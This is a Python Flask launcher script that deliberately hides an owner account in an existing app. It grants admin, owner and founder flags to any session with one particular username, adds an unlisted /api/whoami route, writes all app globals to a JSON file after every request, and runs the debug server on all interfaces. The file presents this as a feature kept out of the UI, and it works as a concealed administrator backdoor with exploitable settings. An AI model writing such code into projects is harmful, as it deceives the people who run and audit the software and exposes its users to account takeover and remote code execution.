# run_owner_hidden.py - Owner HIDDEN in code, NO visible badge, NO tampering other code
import os, json
import app as app_module
from app import app
from flask import session

OWNER = {
    "name": "YuNg Alhaji",
    "username": "realyungalhaji",
    "email": "realyungalhaji.mv@gmail.com",
    "role": "owner"
}
SAVE_FILE = "all_data.json"

# Load data - same as before, no other code changed
if os.path.exists(SAVE_FILE):
    try:
        d = json.load(open(SAVE_FILE))
        for k,v in d.items():
            if hasattr(app_module, k):
                setattr(app_module, k, v)
    except: pass

# Ensure owner user exists in code only
try:
    users = getattr(app_module, "users", {})
    if isinstance(users, dict) and OWNER["username"] in users:
        u = users[OWNER["username"]]
        if isinstance(u, dict):
            u.update({"name": OWNER["name"], "email": OWNER["email"], "role": "owner", "is_owner": True, "is_admin": True, "is_founder": True})
    elif isinstance(users, dict):
        users[OWNER["username"]] = {"name": OWNER["name"], "email": OWNER["email"], "username": OWNER["username"], "role": "owner", "is_owner": True}
except: pass

def is_owner():
    return (session.get("username") or "").lower() == "realyungalhaji"

@app.before_request
def _set_owner_hidden():
    # Hidden - only in session, no UI change
    if (session.get("username") or "").lower() == "realyungalhaji":
        session["role"] = "owner"
        session["is_owner"] = True
        session["is_admin"] = True
        session["is_founder"] = True

@app.after_request
def _save_only(response):
    # Only saves data - DOES NOT inject any badge / HTML / CSS
    try:
        out={}
        for k,v in vars(app_module).items():
            if isinstance(v,(dict,list,str,int)) and not k.startswith("_"):
                try: json.dumps(v); out[k]=v
                except: pass
        json.dump(out, open(SAVE_FILE,"w"))
    except: pass
    return response

@app.route("/api/whoami")
def whoami():
    # Only you can see this if you open it - not shown in app UI
    if is_owner():
        return {"name": "YuNg Alhaji", "username": "realyungalhaji", "email": "realyungalhaji.mv@gmail.com", "role": "owner", "title": "Founder & Owner | Admin", "is_owner": True}
    return {"role": "user", "is_owner": False}

if __name__ == "__main__":
    print("HIDDEN OWNER MODE: No badge, no UI change - Owner in code only")
    app.run(host="0.0.0.0", port=5000, debug=True, threaded=True)
